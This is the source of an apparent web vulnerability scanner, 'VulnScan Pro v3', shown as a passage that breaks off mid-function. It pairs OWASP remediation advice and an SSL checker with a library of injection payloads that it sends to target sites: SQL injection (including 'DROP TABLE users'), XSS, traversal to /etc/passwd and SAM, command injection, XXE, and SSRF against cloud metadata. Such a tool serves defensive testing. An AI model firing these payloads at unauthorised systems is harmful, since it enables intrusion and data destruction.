#!/usr/bin/env python3
"""
VulnScan Pro v3 — Enhanced Web Vulnerability Scanner
New: SSL/HTTPS checker, selectable test categories, OWASP fix suggestions, streaming logs
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json, sqlite3, urllib.parse, urllib.request, urllib.error
import time, re, os, sys, hashlib, math, ipaddress, socket, ssl, datetime
import threading, difflib
from datetime import datetime as dt, timezone, timedelta
from collections import defaultdict

DB_PATH = "scans.db"
MAX_LOGS = 8000
REQUEST_TIMEOUT = 10
TIME_BASED_THRESHOLD = 4.5
MAX_CONCURRENT_SCANS = 3

scan_semaphore = threading.Semaphore(MAX_CONCURRENT_SCANS)

# ── Structured logger ──────────────────────────────────────────────────────────
logs: list[dict] = []
log_lock = threading.Lock()

def add_log(message: str, level: str = "INFO", tag: str = "SYSTEM", scan_id=None):
    now = dt.now(timezone.utc)
    entry = {
        "ts":      now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "time":    now.strftime("%H:%M:%S"),
        "level":   level,
        "tag":     tag,
        "msg":     message,
        "scan_id": scan_id,
    }
    entry["line"] = f"[{entry['ts']}] [{level:<5}] [{tag:<12}] {message}"
    with log_lock:
        logs.append(entry)
        if len(logs) > MAX_LOGS:
            logs.pop(0)
    print(entry["line"], file=sys.stderr, flush=True)

def get_logs(since_index: int = 0):
    with log_lock:
        return logs[since_index:]

# ── OWASP Fix Suggestions ──────────────────────────────────────────────────────
OWASP_FIXES = {
    "SQL Injection": {
        "owasp": "A03:2021 – Injection",
        "severity": "Critical",
        "description": "Attacker-controlled input is interpreted as SQL commands, allowing data theft, authentication bypass, or full database compromise.",
        "fixes": [
            {"title": "Use Parameterized Queries / Prepared Statements",
             "detail": "Never concatenate user input into SQL strings. Use placeholders.",
             "code_bad":  "query = 'SELECT * FROM users WHERE id=' + user_input",
             "code_good": "cursor.execute('SELECT * FROM users WHERE id=?', (user_input,))"},
            {"title": "Use an ORM",
             "detail": "ORMs (SQLAlchemy, Hibernate, ActiveRecord) handle escaping automatically."},
            {"title": "Validate & Whitelist Input",
             "detail": "If a field expects an integer, cast and validate strictly before use."},
            {"title": "Least Privilege DB Accounts",
             "detail": "The application DB user should not have DROP, TRUNCATE, or admin rights."},
            {"title": "Suppress Verbose Errors",
             "detail": "Never expose raw database error messages in HTTP responses."},
        ]
    },
    "XSS": {
        "owasp": "A03:2021 – Injection (XSS)",
        "severity": "High",
        "description": "Unescaped user input is reflected into HTML, allowing attackers to execute scripts in victims' browsers.",
        "fixes": [
            {"title": "Context-Aware Output Encoding",
             "detail": "HTML-encode all user data before inserting into HTML. Use libraries like DOMPurify for client-side sanitization.",
             "code_bad":  "innerHTML = userInput",
             "code_good": "textContent = userInput  // or use DOMPurify.sanitize()"},
            {"title": "Content Security Policy (CSP)",
             "detail": "Set a strict CSP header to restrict script execution: Content-Security-Policy: default-src 'self'"},
            {"title": "HttpOnly & Secure Cookie Flags",
             "detail": "Prevent cookie theft even if XSS occurs: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict"},
        ]
    },
    "Path Traversal": {
        "owasp": "A01:2021 – Broken Access Control",
        "severity": "High",
        "description": "Attackers use ../ sequences to read files outside the intended directory (e.g., /etc/passwd).",
        "fixes": [
            {"title": "Canonicalize and Validate File Paths",
             "detail": "Resolve the real path and verify it starts with the allowed base directory.",
             "code_bad":  "open(base_dir + user_input)",
             "code_good": "path = os.path.realpath(base_dir + user_input)\nassert path.startswith(base_dir)"},
            {"title": "Use Indirect File References",
             "detail": "Map user inputs to file names server-side; never pass raw filenames from users."},
        ]
    },
    "Command Injection": {
        "owasp": "A03:2021 – Injection",
        "severity": "Critical",
        "description": "User input is passed to a system shell, giving attackers full OS command execution.",
        "fixes": [
            {"title": "Avoid Shell Commands Entirely",
             "detail": "Use language-native libraries instead of spawning shells (e.g., Python's os.listdir instead of os.system('ls'))."},
            {"title": "Use subprocess with shell=False",
             "detail": "Pass arguments as a list, never a string.",
             "code_bad":  "os.system('ping ' + user_input)",
             "code_good": "subprocess.run(['ping', user_input], shell=False)"},
            {"title": "Strict Input Whitelisting",
             "detail": "Only allow alphanumeric characters and a defined safe set if shell is unavoidable."},
        ]
    },
    "SSTI": {
        "owasp": "A03:2021 – Injection",
        "severity": "Critical",
        "description": "User input is evaluated by a server-side template engine, enabling remote code execution.",
        "fixes": [
            {"title": "Never Pass Untrusted Data to Template Engine",
             "detail": "Render user input as data, not as template code.",
             "code_bad":  "render_template_string(user_input)",
             "code_good": "render_template('page.html', content=user_input)"},
            {"title": "Use a Logic-less Template Engine",
             "detail": "Engines like Mustache/Handlebars limit what templates can execute."},
            {"title": "Sandbox the Template Engine",
             "detail": "Run template rendering in a restricted environment with no access to dangerous builtins."},
        ]
    },
    "Open Redirect": {
        "owasp": "A01:2021 – Broken Access Control",
        "severity": "Medium",
        "description": "The application redirects users to attacker-controlled URLs, enabling phishing attacks.",
        "fixes": [
            {"title": "Use Indirect Redirect Mappings",
             "detail": "Map redirect keys to URLs server-side; never redirect to raw user input."},
            {"title": "Validate Redirect URLs",
             "detail": "If redirect URLs must come from users, validate against an allowlist of trusted domains."},
        ]
    },
    "XXE": {
        "owasp": "A05:2021 – Security Misconfiguration",
        "severity": "Critical",
        "description": "XML parsers process external entity declarations, allowing file reads and SSRF.",
        "fixes": [
            {"title": "Disable External Entities in XML Parser",
             "detail": "Explicitly disable DOCTYPE and external entity processing.",
             "code_good": "parser.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)"},
            {"title": "Use a Safer Data Format",
             "detail": "Prefer JSON or YAML (without unsafe loaders) over XML when possible."},
        ]
    },
    "SSRF": {
        "owasp": "A10:2021 – Server-Side Request Forgery",
        "severity": "Critical",
        "description": "The server fetches attacker-controlled URLs, exposing internal services and cloud metadata.",
        "fixes": [
            {"title": "Validate and Allowlist Outbound URLs",
             "detail": "Only permit requests to pre-approved external domains."},
            {"title": "Block Private IP Ranges",
             "detail": "Reject requests to 169.254.x.x, 10.x.x.x, 172.16-31.x.x, 127.x.x.x before making HTTP calls."},
            {"title": "Disable Unnecessary HTTP Client Features",
             "detail": "Disable redirects, limit protocols to HTTPS only."},
        ]
    },
    "NoSQL Injection": {
        "owasp": "A03:2021 – Injection",
        "severity": "High",
        "description": "Operator injection ($ne, $gt, $regex) bypasses NoSQL query logic.",
        "fixes": [
            {"title": "Use Schema Validation / Type Checking",
             "detail": "Ensure query parameters are the expected type (string, not object) before use."},
            {"title": "Sanitize Operator Keys",
             "detail": "Strip keys starting with $ from user-supplied JSON objects."},
        ]
    },
    "Header Injection": {
        "owasp": "A03:2021 – Injection",
        "severity": "High",
        "description": "CRLF characters in user input allow injecting arbitrary HTTP response headers.",
        "fixes": [
            {"title": "Strip CR/LF from Header Values",
             "detail": "Remove \\r and \\n from any value inserted into HTTP response headers."},
            {"title": "Use Framework-Level Header Setting",
             "detail": "Never manually concatenate headers; use framework APIs that handle encoding."},
        ]
    },
    "LDAP Injection": {
        "owasp": "A03:2021 – Injection",
        "severity": "High",
        "description": "Unescaped user input alters LDAP filter logic, bypassing authentication.",
        "fixes": [
            {"title": "Escape Special LDAP Characters",
             "detail": "Escape: * ( ) \\ NUL before inserting into LDAP filters."},
            {"title": "Use a Parameterized LDAP Library",
             "detail": "Use libraries that handle filter construction safely."},
        ]
    },
    "Prototype Pollution": {
        "owasp": "A08:2021 – Software and Data Integrity Failures",
        "severity": "High",
        "description": "Attackers inject __proto__ or constructor keys to pollute JavaScript object prototypes.",
        "fixes": [
            {"title": "Use Object.create(null) for Merge Targets",
             "detail": "Prevents prototype chain access during deep merges."},
            {"title": "Sanitize Incoming JSON Keys",
             "detail": "Reject keys like __proto__, constructor, prototype before deep merging."},
        ]
    },
    "Mass Assignment": {
        "owasp": "A01:2021 – Broken Access Control",
        "severity": "High",
        "description": "Auto-binding of request parameters to model fields allows privilege escalation.",
        "fixes": [
            {"title": "Explicitly Whitelist Allowed Fields",
             "detail": "Only bind fields explicitly declared as user-editable; never bind all request params."},
        ]
    },
    "Type Confusion": {
        "owasp": "A03:2021 – Injection",
        "severity": "Medium",
        "description": "Unexpected data types (overflow, arrays, null) cause logic errors or exceptions.",
        "fixes": [
            {"title": "Strict Type Validation",
             "detail": "Validate the type and range of every input parameter before processing."},
        ]
    },
    "GraphQL": {
        "owasp": "A05:2021 – Security Misconfiguration",
        "severity": "Medium",
        "description": "Exposed introspection or batching allows schema enumeration and DoS attacks.",
        "fixes": [
            {"title": "Disable Introspection in Production",
             "detail": "Turn off __schema queries in production GraphQL endpoints."},
            {"title": "Implement Query Depth & Complexity Limits",
             "detail": "Reject deeply nested or computationally expensive queries."},
        ]
    },
    "SSL/TLS": {
        "owasp": "A02:2021 – Cryptographic Failures",
        "severity": "High",
        "description": "Missing or misconfigured SSL/TLS exposes data to interception and man-in-the-middle attacks.",
        "fixes": [
            {"title": "Enable HTTPS with a Valid Certificate",
             "detail": "Use Let's Encrypt or a trusted CA. Redirect all HTTP traffic to HTTPS."},
            {"title": "Use TLS 1.2 or Higher",
             "detail": "Disable TLS 1.0, 1.1, and SSLv3."},
            {"title": "Renew Certificates Before Expiry",
             "detail": "Set up automated renewal (e.g., certbot renew) and monitoring."},
            {"title": "Set HSTS Header",
             "detail": "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"},
        ]
    },
    "API Security": {
        "owasp": "A01:2021 – Broken Access Control / API9:2023",
        "severity": "High",
        "description": "APIs that return data without authentication or leak sensitive fields enable data theft and abuse.",
        "fixes": [
            {"title": "Require Authentication on All Sensitive Endpoints",
             "detail": "Use OAuth2, JWT, or API keys; return 401 for unauthenticated requests."},
            {"title": "Implement Fine-Grained Authorization",
             "detail": "Verify the caller may access the specific resource (object-level checks)."},
            {"title": "Minimize Response Payloads",
             "detail": "Never return passwords, tokens, or internal IDs; filter fields by role."},
            {"title": "Restrict CORS",
             "detail": "Avoid Access-Control-Allow-Origin: * for credentialed APIs; allowlist origins."},
        ]
    },
}

# ── SSRF guard ─────────────────────────────────────────────────────────────────
PRIVATE_NETS = [
    ipaddress.ip_network("10.0.0.0/8"), ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"), ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
]

def _is_private(host):
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
        return any(ip in n for n in PRIVATE_NETS)
    except Exception:
        return False

def validate_url(url):
    try:
        p = urllib.parse.urlparse(url)
        if p.scheme not in ("http","https"):
            return False, "Only http/https supported."
        if not p.netloc:
            return False, "URL must include a hostname."
        if _is_private(p.hostname or ""):
            return False, "Target resolves to private/loopback address — blocked."
        return True, ""
    except Exception as e:
        return False, str(e)

# ── Full payload library (condensed from v2) ───────────────────────────────────
VULNERABILITY_TESTS = [
    {"id":"sqli-auth-01","name":"OR bypass","payload":"' OR '1'='1","category":"SQL Injection","type":"Error/Boolean","risk":"Critical"},
    {"id":"sqli-auth-02","name":"Comment bypass","payload":"' OR 1=1--","category":"SQL Injection","type":"Error/Boolean","risk":"Critical"},
    {"id":"sqli-auth-03","name":"Double-quote bypass","payload":'" OR "1"="1',"category":"SQL Injection","type":"Error/Boolean","risk":"Critical"},
    {"id":"sqli-auth-04","name":"Parentheses bypass","payload":"') OR ('1'='1","category":"SQL Injection","type":"Error/Boolean","risk":"Critical"},
    {"id":"sqli-bool-01","name":"Boolean TRUE","payload":"' AND 1=1--","category":"SQL Injection","type":"Boolean-Blind","risk":"High"},
    {"id":"sqli-bool-02","name":"Boolean FALSE","payload":"' AND 1=2--","category":"SQL Injection","type":"Boolean-Blind","risk":"Medium"},
    {"id":"sqli-union-01","name":"UNION 1 col","payload":"' UNION SELECT NULL--","category":"SQL Injection","type":"UNION","risk":"Critical"},
    {"id":"sqli-union-02","name":"UNION 2 cols","payload":"' UNION SELECT NULL,NULL--","category":"SQL Injection","type":"UNION","risk":"Critical"},
    {"id":"sqli-union-03","name":"UNION 3 cols","payload":"' UNION SELECT NULL,NULL,NULL--","category":"SQL Injection","type":"UNION","risk":"Critical"},
    {"id":"sqli-union-04","name":"UNION info_schema","payload":"' UNION SELECT table_name,NULL FROM information_schema.tables--","category":"SQL Injection","type":"UNION","risk":"Critical"},
    {"id":"sqli-err-01","name":"Error MySQL EXTRACTVALUE","payload":"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--","category":"SQL Injection","type":"Error-Based","risk":"High"},
    {"id":"sqli-err-02","name":"Error MSSQL CONVERT","payload":"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--","category":"SQL Injection","type":"Error-Based","risk":"High"},
    {"id":"sqli-time-01","name":"Sleep MySQL","payload":"' AND SLEEP(5)--","category":"SQL Injection","type":"Time-Based","risk":"High"},
    {"id":"sqli-time-02","name":"Waitfor MSSQL","payload":"'; WAITFOR DELAY '0:0:5'--","category":"SQL Injection","type":"Time-Based","risk":"High"},
    {"id":"sqli-time-03","name":"pg_sleep PostgreSQL","payload":"'; SELECT pg_sleep(5)--","category":"SQL Injection","type":"Time-Based","risk":"High"},
    {"id":"sqli-stk-01","name":"Stacked DROP TABLE","payload":"'; DROP TABLE users--","category":"SQL Injection","type":"Stacked","risk":"Critical"},
    {"id":"sqli-order","name":"ORDER BY (column enum)","payload":"' ORDER BY 1--","category":"SQL Injection","type":"UNION-Assist","risk":"Medium"},

    {"id":"xss-ref-01","name":"Reflected script tag","payload":"<script>alert('XSS')</script>","category":"XSS","type":"Reflected","risk":"High"},
    {"id":"xss-ref-02","name":"IMG onerror","payload":"<img src=x onerror=alert(1)>","category":"XSS","type":"Reflected","risk":"High"},
    {"id":"xss-ref-03","name":"SVG onload","payload":"<svg onload=alert(1)>","category":"XSS","type":"Reflected","risk":"High"},
    {"id":"xss-ref-04","name":"JavaScript URI","payload":"javascript:alert(document.domain)","category":"XSS","type":"Reflected","risk":"High"},
    {"id":"xss-ref-05","name":"Event in input","payload":'"><input onmouseover=alert(1)>',"category":"XSS","type":"Reflected","risk":"High"},
    {"id":"xss-ref-06","name":"Encoded script","payload":"%3Cscript%3Ealert(1)%3C/script%3E","category":"XSS","type":"Encoding","risk":"Medium"},

    {"id":"trav-01","name":"Unix /etc/passwd (x3)","payload":"../../../etc/passwd","category":"Path Traversal","type":"LFI","risk":"High"},
    {"id":"trav-02","name":"Unix /etc/passwd (x6)","payload":"../../../../../../etc/passwd","category":"Path Traversal","type":"LFI","risk":"High"},
    {"id":"trav-03","name":"Windows SAM","payload":"..\\..\\..\\windows\\system32\\config\\sam","category":"Path Traversal","type":"LFI","risk":"High"},
    {"id":"trav-04","name":"Null-byte truncation","payload":"../../../../etc/passwd\x00.jpg","category":"Path Traversal","type":"LFI","risk":"High"},
    {"id":"trav-05","name":"URL-encoded traversal","payload":"%2e%2e%2f%2e%2e%2fetc%2fpasswd","category":"Path Traversal","type":"Encoding","risk":"Medium"},

    {"id":"cmd-01","name":"Semicolon ls","payload":"; ls -la","category":"Command Injection","type":"Unix","risk":"Critical"},
    {"id":"cmd-02","name":"Pipe id","payload":"| id","category":"Command Injection","type":"Unix","risk":"Critical"},
    {"id":"cmd-03","name":"Backtick id","payload":"`id`","category":"Command Injection","type":"Unix","risk":"Critical"},
    {"id":"cmd-04","name":"Dollar subshell","payload":"$(id)","category":"Command Injection","type":"Unix","risk":"Critical"},
    {"id":"cmd-05","name":"Ampersand whoami","payload":"& whoami","category":"Command Injection","type":"Windows","risk":"Critical"},
    {"id":"cmd-06","name":"Sleep 5 (time-based)","payload":"; sleep 5","category":"Command Injection","type":"Time-Based","risk":"High"},

    {"id":"ssti-01","name":"Jinja2 {{7*7}}","payload":"{{7*7}}","category":"SSTI","type":"Jinja2/Twig","risk":"Critical"},
    {"id":"ssti-02","name":"Jinja2 config dump","payload":"{{config}}","category":"SSTI","type":"Jinja2","risk":"Critical"},
    {"id":"ssti-03","name":"Freemarker ${7*7}","payload":"${7*7}","category":"SSTI","type":"Freemarker","risk":"Critical"},
    {"id":"ssti-04","name":"ERB <%= 7*7 %>","payload":"<%= 7*7 %>","category":"SSTI","type":"Ruby ERB","risk":"Critical"},

    {"id":"redir-01","name":"Protocol-relative","payload":"//evil.com","category":"Open Redirect","type":"Protocol-Relative","risk":"Medium"},
    {"id":"redir-02","name":"Absolute HTTP","payload":"http://evil.com","category":"Open Redirect","type":"Absolute","risk":"Medium"},
    {"id":"redir-03","name":"Data URI","payload":"data:text/html,<script>alert(1)</script>","category":"Open Redirect","type":"Data URI","risk":"High"},

    {"id":"xxe-01","name":"Classic XXE file read","payload":'<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',"category":"XXE","type":"Classic","risk":"Critical"},
    {"id":"xxe-02","name":"XXE SSRF","payload":'<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>',"category":"XXE","type":"SSRF","risk":"Critical"},

    {"id":"ssrf-01","name":"AWS metadata","payload":"http://169.254.169.254/latest/meta-data/","category":"SSRF","type":"Cloud Metadata","risk":"Critical"},
    {"id":"ssrf-02","name":"Localhost scan","payload":"http://127.0.0.1/","category":"SSRF","type":"Localhost","risk":"Critical"},
    {"id":"ssrf-03","name":"GCP metadata","payload":"http://metadata.google.internal/computeMetadata/v1/","category":"SSRF","type":"Cloud Metadata","risk":"Critical"},

    {"id":"nosql-01","name":"MongoDB $ne","payload":'{"$ne": null}',"category":"NoSQL Injection","type":"MongoDB","risk":"High"},
    {"id":"nosql-02","name":"MongoDB $gt","payload":'{"$gt": ""}',"category":"NoSQL Injection","type":"MongoDB","risk":"High"},
    {"id":"nosql-03","name":"NoSQL auth bypass","payload":"[$ne]=1","category":"NoSQL Injection","type":"PHP/Node","risk":"High"},

    {"id":"hdr-01","name":"CRLF injection","payload":"foo\r\nSet-Cookie: session=malicious","category":"Header Injection","type":"CRLF","risk":"High"},
    {"id":"hdr-02","name":"Response splitting","payload":"foo\r\n\r\n<script>alert(1)</script>","category":"Header Injection","type":"HTTP Splitting","risk":"High"},

    {"id":"proto-01","name":"Prototype pollution","payload":"__proto__[admin]=true","category":"Prototype Pollution","type":"Node.js","risk":"High"},
    {"id":"proto-02","name":"Constructor pollution","payload":"constructor[prototype][admin]=true","category":"Prototype Pollution","type":"Node.js","risk":"High"},

    {"id":"ldap-01","name":"LDAP wildcard","payload":"*","category":"LDAP Injection","type":"Wildcard","risk":"High"},
    {"id":"ldap-02","name":"LDAP OR bypass","payload":"*)|(cn=*","category":"LDAP Injection","type":"OR Bypass","risk":"High"},

    {"id":"gql-01","name":"GraphQL introspection","payload":"{__schema{types{name}}}","category":"GraphQL","type":"Introspection","risk":"Medium"},
]

# ── Error pattern signatures ───────────────────────────────────────────────────
ERROR_SIGNATURES = [
    (r"SQL syntax.*MySQL", "MySQL syntax error"),
    (r"Warning.*mysql_", "MySQL warning leak"),
    (r"Unclosed quotation mark after the character string", "MSSQL quote error"),
    (r"Microsoft OLE DB Provider for SQL Server", "MSSQL OLE DB"),
    (r"SqlException", "SQL generic exception"),
    (r"ORA-\d{5}", "Oracle ORA error"),
    (r"valid PostgreSQL result", "PostgreSQL result"),
    (r"PG::SyntaxError:", "PostgreSQL syntax"),
    (r"sqlite3\.OperationalError:", "SQLite3 error"),
    (r"you have an error in your sql", "Generic SQL error"),
    (r"Syntax error or access violation", "ODBC error"),
    (r"<script>alert\(", "XSS script reflected"),
    (r"onerror=alert\(", "XSS onerror reflected"),
    (r"\b49\b", "SSTI arithmetic result (7*7=49)"),
    (r"root:x:0:0:", "LFI: /etc/passwd content"),
    (r"uid=\d+\(.*\) gid=\d+", "Command injection: id output"),
]

# ── SSL / HTTPS Checker ────────────────────────────────────────────────────────
def check_ssl(url: str) -> dict:
    """Check HTTPS availability and SSL certificate validity."""
    add_log(f"SSL check starting for: {url}", "INFO", "SSL")
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    result = {
        "https_available": False,
        "https_redirects": False,
        "certificate_valid": False,
        "certificate_expired": False,
        "certificate_self_signed": False,
        "cert_subject": "",
        "cert_issuer": "",
        "cert_expiry": "",
        "cert_days_remaining": None,
        "tls_version": "",
        "hsts_enabled": False,
        "error": "",
        "vulnerable": False,
        "findings": [],
    }

    # 1. Check if HTTPS is available
    https_url = url.replace("http://", "https://") if url.startswith("http://") else url
    if not https_url.startswith("https://"):
        https_url = "https://" + host

    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=8) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                result["https_available"] = True
                result["tls_version"] = ssock.version() or ""
                cert = ssock.getpeercert()

                # Subject
                subject = dict(x[0] for x in cert.get("subject", []))
                issuer  = dict(x[0] for x in cert.get("issuer", []))
                result["cert_subject"] = subject.get("commonName", "")
                result["cert_issuer"]  = issuer.get("commonName", "")
                result["certificate_self_signed"] = (subject == issuer)

                # Expiry
                expiry_str = cert.get("notAfter","")
                if expiry_str:
                    expiry_dt = dt.strptime(expiry_str, "%b %d %H:%M:%S %Y %Z")
                    result["cert_expiry"] = expiry_dt.strftime("%Y-%m-%d")
                    days_left = (expiry_dt - dt.now()).days
                    result["cert_days_remaining"] = days_left
                    if days_left < 0:
                        result["certificate_expired"] = True
                        result["vulnerable"] = True
                        result["findings"].append("Certificate EXPIRED")
                    elif days_left < 30:
                        result["findings"].append(f"Certificate expires in {days_left} days — renew soon!")
                    result["certificate_valid"] = (days_left >= 0 and not result["certificate_self_signed"])

                if result["certificate_self_signed"]:
                    result["vulnerable"] = True
                    result["findings"].append("Self-signed certificate — not trusted by browsers")

                add_log(f"SSL OK: {result['tls_version']}, expires {result['cert_expiry']}, days_left={result['cert_days_remaining']}", "INFO", "SSL")

        # 2. Check HSTS
        try:
            req = urllib.request.Request(https_url, headers={"User-Agent": "VulnScanPro/3.0"})
            with urllib.request.urlopen(req, timeout=6) as resp:
                hsts = resp.headers.get("Strict-Transport-Security","")
                result["hsts_enabled"] = bool(hsts)
                if not hsts:
                    result["findings"].append("HSTS header missing — add Strict-Transport-Security")
        except Exception:
            pass

    except ssl.SSLCertVerificationError as e:
        result["https_available"] = True
        result["certificate_valid"] = False
        result["vulnerable"] = True
        result["error"] = str(e)
        result["findings"].append(f"SSL certificate verification failed: {str(e)[:120]}")
        add_log(f"SSL cert error: {e}", "WARN", "SSL")

    except (ConnectionRefusedError, socket.timeout, OSError) as e:
        result["https_available"] = False
        result["vulnerable"] = True
        result["error"] = str(e)
        result["findings"].append("HTTPS port 443 not reachable — site may be HTTP-only")
        add_log(f"SSL not available: {e}", "WARN", "SSL")

    except Exception as e:
        result["error"] = str(e)
        add_log(f"SSL check error: {e}", "ERROR", "SSL")

    # 3. Check if HTTP redirects to HTTPS
    if parsed.scheme == "http":
        try:
            class NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, req, fp, code, msg, headers, newurl):
                    return None
            opener = urllib.request.build_opener(NoRedirect)
            req = urllib.request.Request(url, headers={"User-Agent":"VulnScanPro/3.0"})
            try:
                with opener.open(req, timeout=5) as resp:
                    result["https_redirects"] = False
            except urllib.error.HTTPError as e:
                if e.code in (301, 302, 307, 308):
                    loc = e.headers.get("Location","")
                    result["https_redirects"] = loc.startswith("https://")
        except Exception:
            pass

    if not result["https_available"]:
        result["findings"].append("HTTPS not available — all traffic is unencrypted!")
        result["vulnerable"] = True
    elif not result["https_redirects"] and parsed.scheme == "http":
        result["findings"].append("HTTP does not redirect to HTTPS automatically")

    add_log(f"SSL check complete — vulnerable={result['vulnerable']}, findings={len(result['findings'])}", "INFO", "SSL")
    return result


# ── API Security Scanner (Enhanced) ───────────────────────────────────────────
DEFAULT_API_PATHS = [
    "/login", "/register", "/users", "/users/1", "/users/2",
    "/products", "/orders", "/search", "/admin", "/reset-password",
    "/upload", "/api", "/api/v1", "/graphql", "/health",
    "/swagger.json", "/openapi.json", "/v1/users",
]

INJECTION_PAYLOADS = {
    "SQL Injection":        "' OR 1=1 --",
    "XSS":                  "<script>alert(1)</script>",
    "Command Injection":    "; ls",
    "Path Traversal":       "../../etc/passwd",
    "SSTI":                 "{{7*7}}",
    "NoSQL Injection":      '{"$ne": null}',
}

SENSITIVE_JSON_RE = re.compile(
    r'"(password|passwd|secret|api[_-]?key|access_token|refresh_token|ssn|creditCard|credit_card|cvv)"\s*:',
    re.I,
)
SENSITIVE_BODY_RE = re.compile(
    r"(password\s*[:=]|api[_-]?key\s*[:=]|secret\s*[:=]|bearer\s+[a-z0-9\-_.]{20,})",
    re.I,
)
API_PATH_HINT = re.compile(r"/api|/graphql|/v\d|/rest/|/users|/admin|swagger|openapi", re.I)


def _join_url(base: str, path: str) -> str:
    b = base.rstrip("/")
    if not path or path == "/":
        return b + "/"
    p = path if path.startswith("/") else "/" + path
    return b + p


def _looks_json(body: str) -> bool:
    t = (body or "").lstrip()
    return t.startswith("{") or t.startswith("[")


def _is_probably_html(body: str) -> bool:
    s = (body or "")[:400].lower()
    return "<html" in s or "<!doctype" in s or "<body" in s


def _http_json_post(url, data=None, timeout=REQUEST_TIMEOUT):
    payload = json.dumps(data or {}).encode("utf-8")
    h = dict(HEADERS)
    h["Content-Type"] = "application/json"
    h["Accept"] = "application/json, */*"
    start = time.monotonic()
    try:
        req = urllib.request.Request(url, data=payload, headers=h, method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(24576).decode("utf-8", errors="replace")
            return {"ok": True, "status": resp.status, "body": body, "headers": dict(resp.headers), "time": round(time.monotonic() - start, 3)}
    except urllib.error.HTTPError as e:
        try: body = e.read(8192).decode("utf-8", errors="replace")
        except: body = ""
        return {"ok": False, "status": e.code, "body": body, "headers": dict(e.headers) if e.headers else {}, "time": round(time.monotonic() - start, 3)}
    except Exception as ex:
        return {"ok": False, "status": None, "body": "", "headers": {}, "time": round(time.monotonic() - start, 3), "error": str(ex)}


def _http_get_api(url, timeout=REQUEST_TIMEOUT):
    start = time.monotonic()
    h = dict(HEADERS)
    h["Accept"] = "application/json, */*"
    try:
        req = urllib.request.Request(url, headers=h)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(24576).decode("utf-8", errors="replace")
            return {"ok": True, "status": resp.status, "body": body, "headers": dict(resp.headers), "time": round(time.monotonic() - start, 3)}
    except urllib.error.HTTPError as e:
        try: body = e.read(8192).decode("utf-8", errors="replace")
        except: body = ""
        return {"ok": False, "status": e.code, "body": body, "headers": dict(e.headers) if e.headers else {}, "time": round(time.monotonic() - start, 3)}
    except Exception as ex:
        return {"ok": False, "status": None, "body": "", "headers": {}, "time": round(time.monotonic() - start, 3), "error": str(ex)}


def _detect_rate_limit(base_url: str, path: str) -> bool:
    """Send 8 rapid requests; if all succeed with 200, likely no rate limiting."""
    url = _join_url(base_url, path)
    codes = []
    for _ in range(8):
        r = _http_get_api(url, timeout=4)
        if r.get("status"): codes.append(r["status"])
    rate_limited = any(c in (429, 503) for c in codes)
    return not rate_limited  # True = no rate limit detected


def _inject_and_check(base_url: str, path: str, payload: str, vuln_name: str) -> dict | None:
    """POST a payload to the path and check for anomalous response."""
    url = _join_url(base_url, path)
    # Try JSON body injection
    body_data = {"input": payload, "q": payload, "username": payload, "password": payload}
    resp = _http_json_post(url, data=body_data)
    body_text = (resp.get("body") or "")
    status = resp.get("status")
    findings = []
    # SQL injection signals
    if vuln_name == "SQL Injection":
        for pat, lbl in ERROR_SIGNATURES[:10]:
            if re.search(pat, body_text, re.IGNORECASE):
                return {"vuln": vuln_name, "evidence": lbl, "severity": "Critical", "status": status}
    # XSS reflected
    if vuln_name == "XSS" and "<script>alert(1)</script>" in body_text:
        return {"vuln": vuln_name, "evidence": "XSS payload reflected in response", "severity": "High", "status": status}
    # SSTI
    if vuln_name == "SSTI" and "49" in body_text:
        return {"vuln": vuln_name, "evidence": "Template evaluated 7*7=49", "severity": "Critical", "status": status}
    # Path traversal
    if vuln_name == "Path Traversal" and re.search(r"root:x:0:0:", body_text):
        return {"vuln": vuln_name, "evidence": "Possible /etc/passwd content in response", "severity": "High", "status": status}
    # Command injection
    if vuln_name == "Command Injection" and re.search(r"uid=\d+\(", body_text):
        return {"vuln": vuln_name, "evidence": "OS command output detected in response", "severity": "Critical", "status": status}
    # 500 error triggered
    if status == 500:
        return {"vuln": vuln_name, "evidence": f"HTTP 500 triggered by {vuln_name} payload", "severity": "Medium", "status": status}
    return None


def _analyze_api_resp(resp, method: str, path: str) -> dict:
    body = (resp.get("body") or "")
    st = resp.get("status")
    hdrs = resp.get("headers") or {}
    flags = []
    acao = hdrs.get("Access-Control-Allow-Origin", "") or hdrs.get("access-control-allow-origin", "")
    if acao == "*":
        flags.append({"flag": "cors_wildcard", "label": "CORS wildcard (*)", "severity": "High"})
    if SENSITIVE_JSON_RE.search(body) or SENSITIVE_BODY_RE.search(body):
        flags.append({"flag": "sensitive_data_leaked", "label": "Sensitive data in response", "severity": "High"})
    json_like = _looks_json(body)
    html_like = _is_probably_html(body)
    apiish = bool(API_PATH_HINT.search(path))
    if st in (200, 201, 202):
        if method == "GET" and json_like and not html_like:
            flags.append({"flag": "open_json_data", "label": "JSON data without authentication", "severity": "Medium"})
        elif method == "GET" and apiish and not html_like and len(body) > 2:
            flags.append({"flag": "api_data_no_auth", "label": "API data accessible without auth", "severity": "Medium"})
    # Check missing security headers
    missing_hdrs = []
    for hdr in ["X-Content-Type-Options", "X-Frame-Options", "Content-Security-Policy"]:
        if not any(h.lower() == hdr.lower() for h in hdrs):
            missing_hdrs.append(hdr)
    if missing_hdrs:
